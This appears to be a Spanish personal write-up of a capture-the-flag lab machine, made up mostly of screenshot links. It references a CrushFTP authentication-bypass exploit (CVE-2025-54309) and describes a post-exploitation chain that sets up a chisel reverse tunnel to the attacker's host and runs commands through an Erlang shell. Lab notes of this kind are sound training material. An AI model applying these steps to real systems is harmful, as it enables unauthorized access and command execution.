
![](../../Imágenes/Pasted%20image%2020251212002821.png)

![](../../Imágenes/Pasted%20image%2020251212002908.png)


![](../../Imágenes/Pasted%20image%2020251212003848.png)





![](../../Imágenes/Pasted%20image%2020251212003339.png)


![](../../Imágenes/Pasted%20image%2020251212003657.png)


![](../../Imágenes/Pasted%20image%2020251212003937.png)



![](../../Imágenes/Pasted%20image%2020251212004041.png)




![](../../Imágenes/Pasted%20image%2020251212004026.png)



![](../../Imágenes/Pasted%20image%2020251212004152.png)



![](../../Imágenes/Pasted%20image%2020251212005420.png)



https://www.exploit-db.com/exploits/52295 (con el CVE-2025-54309 se pueden enumerar los usuarios y te permite realizar el exploit de la race condition https://github.com/watchtowrlabs/watchTowr-vs-CrushFTP-Authentication-Bypass-CVE-2025-54309 --> no se usó este método)


![](../../Imágenes/Pasted%20image%2020251212015339.png)




![](../../Imágenes/Pasted%20image%2020251212015308.png)


![](../../Imágenes/Pasted%20image%2020251212020134.png)



![](../../Imágenes/Pasted%20image%2020251212020218.png)


![](../../Imágenes/Pasted%20image%2020251212021901.png)



![](../../Imágenes/Pasted%20image%2020251212021929.png)



![](../../Imágenes/Pasted%20image%2020251212022000.png)



![](../../Imágenes/Pasted%20image%2020251212022535.png)



![](../../Imágenes/Pasted%20image%2020251212022550.png)


credenciales admin pagina

![](../../Imágenes/Pasted%20image%2020251212025348.png)


![](../../Imágenes/Pasted%20image%2020251212033027.png)


(**acordarse de hacer caps**) buscamos procesos ss -tulnp nos fijamos en el 2222, como es un programa custom miramos en /opt /usr/local que es donde se suelen almacenar, en opt no encontramos nada pero en local encontramos en bin la ruta de un erlang al acceder vemos credenciales (esto se puede hacer con linpeas pero no caí), hacemos port forward nuestra kali /usr/bin/chisel server -p 8080 --reverse y montamos server python para pasarnos chisel, en la victima chisel client 10.10.15.195:8080 R:2222:127.0.0.1:2222 , hacemos ssh y ale al ser erlang los comandos se ejecutan os:cmd("comando") están ahí ambas flags, no hace falta escalar privilegios.